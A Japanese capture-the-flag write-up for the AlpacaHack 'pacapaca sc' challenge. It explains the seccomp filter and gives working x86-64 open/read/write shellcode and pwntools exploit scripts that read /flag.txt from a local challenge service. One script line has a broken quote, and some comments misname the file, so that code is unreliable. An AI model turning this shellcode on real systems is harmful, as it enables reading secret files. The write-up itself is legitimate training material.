# ■ pacapaca-sc
[pacapaca sc - AlpacaHack](https://alpacahack.com/challenges/pacapaca-sc)

# 1. Writeup
## 1.0. `chal.c`
`chal.c`:
```C
...
 9	int main(void){
10	    void *shellcode;
11	    ssize_t n;
12	    scmp_filter_ctx ctx;
13	
14	    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
15	                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
16	    if (shellcode == MAP_FAILED) _exit(1);
17	    printf("paca?\n");
18	    n = read(0, shellcode, 0x1000);
19	    if (n <= 0) _exit(1);
20	
21	    ctx = seccomp_init(SCMP_ACT_KILL);
22	    if (ctx == NULL) _exit(1);
23	
24	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) < 0) _exit(1);
25	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) < 0) _exit(1);
26	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) < 0) _exit(1);
27	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0) _exit(1);
28	
29	    if (seccomp_load(ctx) < 0) _exit(1);
30	    seccomp_release(ctx);
31	    printf("paca!\n");
32	    ((void (*)(void))shellcode)();
33	    
34	}
```

## 1.1. seccomp

```C
24	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) < 0) _exit(1);
25	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) < 0) _exit(1);
26	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) < 0) _exit(1);
27	    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0) _exit(1);
```

`read`, `write`, `open` が許可されている. ので, `shellcode` に `/flag.txt` を取得するシェルコードを渡せば良い.

## 1.2. シェルコード作成
### 1.2.1. Pwntools: `pwnlib.shellcraft`

`open()`:
```python
shellcraft.open('/flag.txt')
```
- ファイルディスクリプタ値を戻り値として `rax` に格納する. (`0`(=`stdin`), `1`(=`stdout`), `2`(=`stderr`)は使用されているので, 状況に応じて`3`以上の値が戻る.)

`read()`:
```python
shellcraft.read('rax', 'rsp', 0x100)
```
- `open()` で `rax` に保存されたfdに出力する.
- `read()` の第2引数 `buf` にはwritableの有効メモリアドレスを指定する必要があるので, `rsp` のアドレスに書き込む.
- 最大読み込みサイズを `0x100` (256byte)
- 読み込むことのできたbyteサイズを戻り値として `rax` に格納する.

`write()`:
```python
shellcraft.write(1, 'rsp', 'rax')
```
- 出力先は `1`(=`stdout`).
- 出力する `buf` は `rsp` に格納されている値.
- 最大出力サイズは, `read()` で `rax` に保存されているbyteサイズ.

### 1.2.2. アセンブリ直書き
1.2.1. を再現するアセンブリを直書きしても良い.

`open()`:
```python
/* open(file='/file.txt', oflag=0, mode=0) */
push 0x74 /* b't\0\0\0\0\0\0\0' */
mov rax, 0x78742e67616c662f /* b'/flag.tx' */
push rax
mov rdi, rsp /* filename */
xor esi, esi /* oflag=0 */
xor edx, edx /* mode=0 */
mov eax, 2 /* SYS_open */
syscall
```
- `b'/flag.txt'` を `rdi` に格納するとき, リトルエンディアンに注意.

`read()`:
```python
/* call read('rax', 'rsp', 0x100) */
mov rdi, rax /* fd=new_fd */
mov rsi, rsp /* buf='rsp' */
mov edx, 0x100 /* nbytes=0x100 */
xor eax, eax /* SYS_read */
syscall
```

`write()`:
```python
/* call write(fd=1, buf='rsp', nbytes='rax') */
mov edi, 1 /* fd=stdout */
mov rsi, rsp /* buf='rsp' */
mov rdx, rax  /* nbytes='rax' */
mov eax, 1 /* SYS_write */
syscall
```

## 1.3. `solve.py`
### 1.3.1. `pwnlib.shellcraft`
`solve.py`:
```python
from pwn import *

context.binary = ELF('./chal')

_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

code = shellcraft.open('/flag.txt')
code += shellcraft.read('rax, 'rsp', 0x100)
code += shellcraft.write(1, 'rsp', 'rax')
byte_code = asm(code)

io.send(byte_code)

io.recvuntil(b'paca!\n')
log.info('{}'.format(io.recvregex(b'Alpaca{.+}').decode()))
```

### 1.3.2. アセンブリ
`solve-asm.py`:
```python
from pwn import *

context.binary = ELF('./chal')

_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

open_asm = '''
	/* open(file='/file.txt', oflag=0, mode=0) */
	push 0x74 /* b't\0\0\0\0\0\0\0' */
	mov rax, 0x78742e67616c662f /* b'/flag.tx' */
	push rax
	mov rdi, rsp /* filename */
	xor esi, esi /* oflag=0 */
	xor edx, edx /* mode=0 */
	mov eax, 2 /* SYS_open */
	syscall
'''

read_asm = '''
	/* call read('rax', 'rsp', 0x100) */
	mov rdi, rax /* fd=new_fd */
	mov rsi, rsp /* buf='rsp' */
	mov edx, 0x100 /* nbytes=0x100 */
	xor eax, eax /* SYS_read */
	syscall
'''

write_asm = '''
	/* call write(fd=1, buf='rsp', nbytes='rax') */
	mov edi, 1 /* fd=stdout */
	mov rsi, rsp /* buf='rsp' */
	mov rdx, rax  /* nbytes='rax' */
	mov eax, 1 /* SYS_write */
	syscall
'''

code = open_asm + read_asm + write_asm
bin = asm(code)

io.send(bin)

io.recvuntil(b'paca!\n')
log.info('{}'.format(io.recvregex(b'Alpaca{.+}').decode()))
```

# 2. レジスタ
## 2.1. 関数呼び出しに用いる引数レジスタ, 戻り値
アセンブリを理解するにあたって, 関数呼び出しの引数に用いるレジスタは以下のようになっている.
1. `RDI`
2. `RSI`
3. `RDX`
4. `RCX`
5. `R8`
6. `R9`
7. 以降はスタックに積む

- 戻り値は `RAX` に格納する.
## 2.2. `R??` と `E??`
`R??` レジスタは8byte(64bit), `E??` レジスタは `R??` レジスタの下位4byte(32bit)を扱う.

32bit演算に対して計算や代入を行うと上位4byteはゼロクリアされる.